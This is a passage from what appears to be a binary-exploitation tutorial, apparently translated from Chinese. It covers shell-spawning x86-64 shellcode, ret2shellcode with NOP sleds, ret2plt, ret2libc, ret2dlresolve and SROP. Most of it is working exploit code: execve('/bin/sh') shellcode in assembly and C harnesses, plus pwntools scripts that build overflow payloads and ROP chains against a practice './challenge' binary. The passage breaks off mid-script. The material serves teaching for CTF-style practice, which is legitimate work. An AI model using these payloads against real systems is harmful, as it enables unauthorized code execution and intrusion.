<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sc = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    mov al, 59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>24-byte shellcode</strong> (source: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43550">https://www.exploit-db.com/exploits/43550</a> ):</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">global _start</span></span><br><span class="line"><span class="comment">section .text</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">	push 59</span></span><br><span class="line"><span class="comment">	pop rax</span></span><br><span class="line"><span class="comment">	cdq</span></span><br><span class="line"><span class="comment">	push rdx</span></span><br><span class="line"><span class="comment">	mov rbx,0x68732f6e69622f2f</span></span><br><span class="line"><span class="comment">	push rbx</span></span><br><span class="line"><span class="comment">	push rsp</span></span><br><span class="line"><span class="comment">	pop rdi</span></span><br><span class="line"><span class="comment">	push rdx</span></span><br><span class="line"><span class="comment">	push rdi</span></span><br><span class="line"><span class="comment">	push rsp</span></span><br><span class="line"><span class="comment">	pop rsi</span></span><br><span class="line"><span class="comment">	syscall</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> code[] = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len:%d bytes\n&quot;</span>, <span class="built_in">strlen</span>(code));</span><br><span class="line">    (*(<span class="type">void</span>(*)()) code)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>23-byte shellcode</strong> (source: <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/36858">https://www.exploit-db.com/exploits/36858</a> ):</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    .global _start</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">    xorl %esi, %esi</span></span><br><span class="line"><span class="comment">    movq $0x68732f2f6e69622f, %rbx</span></span><br><span class="line"><span class="comment">    pushq %rsi</span></span><br><span class="line"><span class="comment">    pushq %rbx</span></span><br><span class="line"><span class="comment">    pushq %rsp</span></span><br><span class="line"><span class="comment">    popq %rdi</span></span><br><span class="line"><span class="comment">    pushq $59</span></span><br><span class="line"><span class="comment">    popq %rax</span></span><br><span class="line"><span class="comment">    xorl %edx, %edx</span></span><br><span class="line"><span class="comment">    syscall</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;strlen(shellcode)=%d\n&quot;</span>, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ret2shellcode-1"><a href="#ret2shellcode-1" class="headerlink" title="ret2shellcode"></a><strong>ret2shellcode</strong></h5><p><strong>ret2shellcode</strong> means: during exploitation (e.g., via stack overflow), <strong>inject your shellcode into memory</strong> (commonly stack/heap/<code>.bss</code>) and then <strong>redirect control flow to that shellcode</strong> by overwriting the return address or using a jump gadget (like <code>jmp *sp</code>), so arbitrary instructions execute.</p>
<p>First, only consider writing shellcode to the stack and executing it:</p>
<p>This generally requires:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NX:         NX enabled</span><br><span class="line"></span><br><span class="line">Stack:      No canary found</span><br><span class="line">PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>We discuss two cases: ASLR enabled/disabled.</p>
<p><strong>1. ASLR enabled:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(fileno(<span class="built_in">stdin</span>), buf, <span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Assume we can obtain the stack address of <code>buf</code> (the program prints it here).</p>
<p>We can build:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">payload = sc.ljust(<span class="number">0x48</span>, <span class="string">b&quot;A&quot;</span>) + p64(buf_addr)</span><br></pre></td></tr></table></figure>
<p>We write shellcode into <code>buf</code>, then overwrite the return address to jump to <code>buf</code>.</p>
<p><br></p>
<p>If we cannot directly leak <code>buf</code>, but <code>buf</code>’s address is stored in a register (e.g., <code>rsi</code>) and the program contains a gadget like <code>jmp rsi</code>, we can jump to it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())   <span class="comment"># /bin/sh</span></span><br><span class="line"></span><br><span class="line">JMP_RSI = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;jmp rsi&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    <span class="number">0</span>:      shellcode,</span><br><span class="line">    <span class="number">256</span>:    JMP_RSI</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><strong>2. ASLR disabled:</strong></p>
<p>Since ASLR is off, after writing shellcode to the stack we can brute-force the stack address.</p>
<p>If the payload is:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Shellcode] [Return Address]</span><br></pre></td></tr></table></figure>
<p>brute forcing is inefficient because you must hit the exact start address of the shellcode.</p>
<p>To increase success rate, use a <strong>NOP sled</strong>.</p>
<p><code>NOP</code> means “No Operation”: it does nothing and just advances the instruction pointer.</p>
<ul>
<li>On x86, the most common NOP opcode is <code>0x90</code>.</li>
</ul>
<p>If you place a long NOP sequence before the shellcode, you no longer need to return to the exact shellcode start—landing anywhere in the NOP sled will “slide” into the shellcode.</p>
<p>Optimized structure:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Padding] [Return Address] [NOP] [Shellcode]</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[NOP] [Shellcode] [Return Address]</span><br></pre></td></tr></table></figure>
<p>Then you can brute-force in steps roughly equal to the NOP sled length without missing it.</p>
<p>Example:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">NOP_len = <span class="number">0x100</span></span><br><span class="line">NOP = <span class="string">b&#x27;\x90&#x27;</span> * NOP_len</span><br><span class="line">code = NOP + sc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span> + p64(addr_int) + code</span><br></pre></td></tr></table></figure>
<h4 id="ret2plt"><a href="#ret2plt" class="headerlink" title="ret2plt"></a><strong>ret2plt</strong></h4><p><strong>ret2plt</strong> means: overwrite the return address to jump into a function stub in the binary’s <strong>PLT</strong>, calling a function through the PLT/GOT mechanism.</p>
<p>This is often used when the program already contains (or has resolved) <code>system</code>, and you can construct a ROP chain using existing functions/gadgets.</p>
<p>We consider several cases:</p>
<p><strong>1. Program has <code>system</code>, a <code>&quot;/bin/sh&quot;</code> string, and a <code>pop rdi ; ret</code> gadget.</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">bin_sh = p64(<span class="number">0x400808</span>)  <span class="comment"># address of &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">ret = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system = p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + pop_rdi + bin_sh + ret + system</span><br><span class="line"><span class="comment"># ret is for stack alignment; sometimes needed, sometimes not</span></span><br></pre></td></tr></table></figure>
<p>If there is no <code>&quot;/bin/sh&quot;</code>, using <code>&quot;sh&quot;</code> usually works too.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line">sh = p64(<span class="built_in">next</span>(elf.search(<span class="string">b&#x27;sh&#x27;</span>)))</span><br><span class="line">ret = p64(<span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>))))</span><br><span class="line">system = p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + pop_rdi + sh + ret + system</span><br></pre></td></tr></table></figure>
<p><strong>2. Program has <code>system</code>, <code>pop rdi ; ret</code>, and an input function (e.g., gets/read/scanf).</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_add = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gets_add = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">data_add = elf.bss() + <span class="number">0x100</span>  <span class="comment"># add offset to avoid overwriting critical .bss data</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="built_in">next</span>(elf.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span>*offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># call gets(data_add) to write &quot;/bin/sh&quot; into .bss</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_add)</span><br><span class="line">payload += p64(gets_add)</span><br><span class="line"></span><br><span class="line"><span class="comment"># second-stage ROP: system(data_add)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(data_add)</span><br><span class="line">payload += p64(sys_add)</span><br></pre></td></tr></table></figure>
<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a><strong>ret2libc</strong></h4><p><strong>ret2libc</strong> means: when you have a stack overflow but <strong>cannot execute injected shellcode</strong> (typically because NX/DEP), you hijack control flow into existing libc functions/strings (e.g., <code>system()</code>, <code>/bin/sh</code>) to execute commands.</p>
<p>Typical workflow has two steps:</p>
<ol>
<li><strong>Leak libc base</strong></li>
<li><strong>Compute target function/gadget addresses and build a ROP chain</strong></li>
</ol>
<p><strong>1. If ASLR is disabled on the server, you can brute-force libc base:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.41.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> libc_base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7ffff7dff000</span>,<span class="number">0x7ffff7d00000</span>,-<span class="number">0x1000</span>):</span><br><span class="line">    </span><br><span class="line">    system_addr = libc_base  + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    rop_libc  = ROP(libc)</span><br><span class="line">    pop_rdi  = libc_base + rop_libc.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line">    ret = libc_base + rop_libc.find_gadget([<span class="string">&#x27;ret&#x27;</span>]).address</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x58</span></span><br><span class="line">    payload += p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<p>Whether you need <code>ret</code> depends on stack alignment.</p>
<p><strong>2. With ASLR enabled:</strong></p>
<p>Usually you leak a real function address, compute libc base, then compute other addresses.</p>
<p>Example (assume you leaked <code>printf</code>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.41.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base   = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = libc_base  + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rop_libc= ROP(libc)</span><br><span class="line">g_pop = rop_libc.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])</span><br><span class="line">g_ret = rop_libc.find_gadget([<span class="string">&#x27;ret&#x27;</span>])</span><br><span class="line">POP_RDI = libc_base + g_pop.address</span><br><span class="line">RET     = libc_base + g_ret.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(POP_RDI) + p64(binsh_addr) + p64(RET) + p64(system_addr)</span><br></pre></td></tr></table></figure>
<h4 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a><strong>ret2dlresolve</strong></h4><p><strong>ret2dlresolve</strong> is a technique that abuses the dynamic linker’s <strong>lazy binding</strong> mechanism.</p>
<p><strong>Key advantage:</strong> <strong>no need to leak libc base</strong>. Even with ASLR enabled, as long as the binary does not use <strong>Full RELRO</strong> (so lazy binding still works), and you have a controllable stack overflow plus a writable known address region (e.g., <code>.bss</code>), you can forge a resolution request so the dynamic linker “resolves” <code>system</code> for you and calls it.</p>
<p>Manual payload construction is very painful on 64-bit due to alignment and structure complexity. Fortunately pwntools provides <code>Ret2dlresolvePayload</code>.</p>
<p><strong>Exploit template:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">&quot;system&quot;</span>, args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr, <span class="built_in">len</span>(dlresolve.payload))</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += raw_rop</span><br><span class="line">payload += dlresolve.payload</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a><strong>SROP</strong></h4><p><strong>SROP (Sigreturn Oriented Programming)</strong> relies on the Linux syscall <strong><code>rt_sigreturn</code> (syscall number 15)</strong>.</p>
<p>When Linux handles a signal, the kernel saves the register context onto the stack as a <code>SigreturnFrame</code>. When the signal handler finishes, it uses <code>rt_sigreturn</code> to restore registers.</p>
<ul>
<li><strong>Key point</strong>: <code>rt_sigreturn</code> blindly restores registers from the stack.</li>
</ul>
<p>So if we forge a <code>SigreturnFrame</code> on the stack and trigger syscall 15, the kernel will load attacker-controlled register values (e.g., for <code>execve(&quot;/bin/sh&quot;)</code>).</p>
<p>(…code and diagrams below remain unchanged, since they are already in English/identifiers.)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; [1] Leak Stage</span><br><span class="line">    ; write(1, rsp, 8)</span><br><span class="line">    mov rax, 1</span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 8</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">vuln_read:</span><br><span class="line">    ; [2] Overflow Stage</span><br><span class="line">    ; read(0, rsp, 500)</span><br><span class="line">    mov rax, 0</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 500</span><br><span class="line">    syscall</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<p>(…remaining SROP content preserved exactly as-is except Chinese text removed/translated:)</p>
<p>Payload A: place a fake frame and return into <code>read</code> again.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+  &lt;-- Stack top (RSP)</span><br><span class="line">|       Read_Addr       |  &lt;-- address of vuln_read (used as return address)</span><br><span class="line">+-----------------------+</span><br><span class="line">|           0           |  &lt;-- padding</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|  Fake SigreturnFrame  |  &lt;-- forged register context</span><br><span class="line">|  (RAX=59, RDI=sh_addr)|</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p>Payload B: set <code>RAX=15</code> and trigger <code>syscall</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">|       Read_Addr       | </span><br><span class="line">+-----------------------+  &lt;-- Stack top (RSP) - overwrites the first 15 bytes of Payload A</span><br><span class="line">|  Syscall_Ret_Addr     |  &lt;-- address of syscall; ret</span><br><span class="line">+-----------------------+</span><br><span class="line">|  Padding (7 bytes)    |  &lt;-- 7-byte padding</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p>After the second read, <code>rax</code> becomes 15 (because 15 bytes were read). The stack then looks like:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+  &lt;-- Stack top (RSP)</span><br><span class="line">|                       |</span><br><span class="line">|  Fake SigreturnFrame  |</span><br><span class="line">|  (RAX=59, RDI=sh_addr)|</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>
<p>So the CPU state is:</p>
<ul>
<li><code>RIP</code>: points to <code>syscall</code></li>
<li><code>RAX</code>: 15 (<code>sys_rt_sigreturn</code>)</li>
<li><code>RSP</code>: points to the start of the fake frame</li>
</ul>
<p>The kernel performs <code>sys_rt_sigreturn</code> and restores registers from our fake frame.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln_read = elf.symbols[<span class="string">&#x27;vuln_read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">syscall_ret = rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>, <span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">f&quot;Stack Address: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span>              <span class="comment"># execve</span></span><br><span class="line">frame.rdi = stack_addr + <span class="number">8</span> + <span class="number">8</span> + <span class="number">40</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span 